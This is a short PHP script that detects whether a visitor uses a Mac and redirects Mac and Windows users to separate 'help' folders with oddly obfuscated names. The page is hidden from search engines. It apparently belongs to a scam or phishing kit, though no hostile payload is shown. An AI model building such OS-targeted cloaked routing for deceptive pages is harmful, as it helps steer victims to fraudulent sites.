<?php
// Get the user agent string
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Default redirect path
$redirectPath = "";

// Detect OS and browser
$isMac = stripos($userAgent, 'Mac') !== false;
$isChrome = stripos($userAgent, 'Chrome') !== false && stripos($userAgent, 'Edge') === false && stripos($userAgent, 'OPR') === false;
$isFirefox = stripos($userAgent, 'Firefox') !== false;
$isEdge = stripos($userAgent, 'Edge') !== false;
$isOpera = stripos($userAgent, 'OPR') !== false || stripos($userAgent, 'Opera') !== false;
$isIE = stripos($userAgent, 'MSIE') !== false || stripos($userAgent, 'Trident') !== false;
$isSafari = stripos($userAgent, 'Safari') !== false && !$isChrome && !$isOpera;

if ($isMac) {
    $redirectPath = "./M10acinfoViShhelp081/index.html";
} else {
    $redirectPath = "./W10ininfoViShhelp081/index.html";
}

// Redirect the user
header("Location: $redirectPath");
exit;
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta name="robots" content="noindex,nofollow">
    <title>Redirecting...</title>
</head>
<body>
    <p>If you are not redirected automatically, <a href="<?php echo $redirectPath; ?>">click here</a>.</p>
</body>
</html>
